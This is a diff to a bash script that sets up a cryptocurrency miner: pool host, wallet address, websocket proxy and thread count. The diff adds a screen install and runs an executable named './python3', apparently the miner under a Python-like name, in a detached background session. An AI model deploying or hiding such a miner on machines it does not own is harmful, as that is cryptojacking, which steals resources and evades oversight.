@@ -1,12 +1,19 @@
 #!/bin/bash
 
+# Install screen if not already installed
+if ! [ -x "$(command -v screen)" ]; then
+  echo 'Installing screen...'
+  sudo apt-get update
+  sudo apt-get install -y screen
+fi
+
 # Set environment variables
 M_ALGO="yespowerr16"
 M_HOST="stratum-asia.rplant.xyz"
 M_PORT="13382"
 M_WORKER="YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC"
 M_PASSWORD="x"
-M_THREADS="25"
+M_THREADS="16"
 M_PROXY="ws://172.233.136.27:8088/proxy"
 
 # Download packages
@@ -49,5 +56,5 @@ cat <<EOL > config.json
 }
 EOL
 
-# Run your python script
-./python3 main.py
+# Start the script inside a screen session
+screen -dmS mining /bin/bash -c './python3 main.py'
